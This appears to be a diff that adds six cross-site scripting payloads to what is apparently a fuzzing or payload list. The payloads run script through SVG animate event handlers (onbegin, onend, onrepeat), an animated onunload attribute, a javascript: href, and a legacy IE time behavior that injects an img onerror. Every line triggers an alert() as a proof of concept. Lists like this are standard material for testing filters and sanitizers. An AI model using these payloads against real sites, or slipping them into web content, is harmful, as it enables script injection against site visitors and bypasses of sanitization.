@@ -1,0 +1,6 @@
+<svg><animate onbegin=alert(1) attributeName=x dur=1s>
+<svg><animate onend=alert(1) attributeName=x dur=1s>
+<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatCount=2 />
+<div id="28">1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2)  attributename=innerhtml values=&lt;img/src=&quot;.&quot;onerror=alert(28)&gt;>//["'`-->]]>]</div>
+<animate attributeName="onunload" to="alert(89)"/>
+<animate attributeName="xlink:href" begin="0" from="javascript:alert(137)" to="&" />
